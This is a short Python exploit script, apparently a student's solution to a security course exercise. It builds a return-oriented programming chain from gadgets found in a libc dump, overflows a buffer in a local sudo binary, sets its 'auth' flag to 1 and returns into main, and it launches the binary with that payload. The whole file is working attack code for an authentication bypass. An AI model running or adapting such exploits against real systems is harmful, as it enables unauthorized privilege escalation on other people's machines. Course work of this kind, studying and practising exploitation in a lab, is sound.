import os, sys

import addresses
import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_arg():
    search = GadgetSearch(LIBC_DUMP_PATH)
    # NOTES:
    # 1. Use `addresses.AUTH` to get the address of the `auth` variable.
    # 2. Don't write addresses of gadgets directly - use the search object to
    #    find the address of the gadget dynamically.
    # 
    # a. load address of auth variable into edx
    # b. prime eax to be 1.
    # c. write eax (which is now 1) into auth.
    # c. jump back into the original address
    getAuth = search.find('pop edx', condition = lambda x: x%16 >0) #condition makes sure the last byte is not 0's as this string is passed to c code
    getOne = search.find('mov eax , 1', condition = lambda x: x%16 >0) 
    bazinga = search.find('mov [edx], eax', condition = lambda x: x%16 >0)
    fillBuff = 'a'*(addresses.CRITICAL_LENGTH)

    code = fillBuff + addresses.address_to_bytes(getAuth) + addresses.address_to_bytes(addresses.AUTH) + addresses.address_to_bytes(getOne)
    code += addresses.address_to_bytes(bazinga) + addresses.address_to_bytes(addresses.MAIN)
    return code
    #print ":".join("{:02x}".format(ord(c)) for c in addresses.address_to_bytes(getOne))
    #raise NotImplementedError()

def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())


if __name__ == '__main__':
    main(sys.argv)
